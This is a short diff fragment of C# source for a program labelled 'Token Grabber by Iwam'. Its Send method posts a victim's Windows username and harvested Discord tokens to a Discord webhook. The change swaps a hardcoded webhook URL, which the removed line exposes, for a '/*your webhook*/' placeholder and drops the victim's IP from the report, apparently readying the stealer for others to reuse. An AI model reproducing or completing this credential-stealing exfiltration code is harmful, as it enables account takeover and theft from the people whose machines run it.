@@ -86,7 +86,7 @@ namespace Custom
 
         private static void Send(string message)
         {
-            Post("https://discord.com/api/webhooks/934107407590780960/PMe4IvUBEmAq-HbXMfl8TDQKqeS2-DaR4N0Q2V4j7GVwwy7XsR6gVkM5y2PIKfIlc56m", new NameValueCollection
+            Post(/*your webhook*/, new NameValueCollection
             {
                 {"username", "Token Grabber by Iwam"},
                 {
@@ -95,7 +95,7 @@ namespace Custom
                 },
                 {
                     "content",
-                    "```\n" + "Report from Iwam\n\n" + "Username: " + Environment.UserName + "\nIP: " +
+                    "```\n" + "Report from Iwam\n\n" + "Username: " + Environment.UserName +
                     "\nTokens:\n\n" + string.Join("\n", message) + "\n\nLast one is correct" + "\n```"
                 }
             });
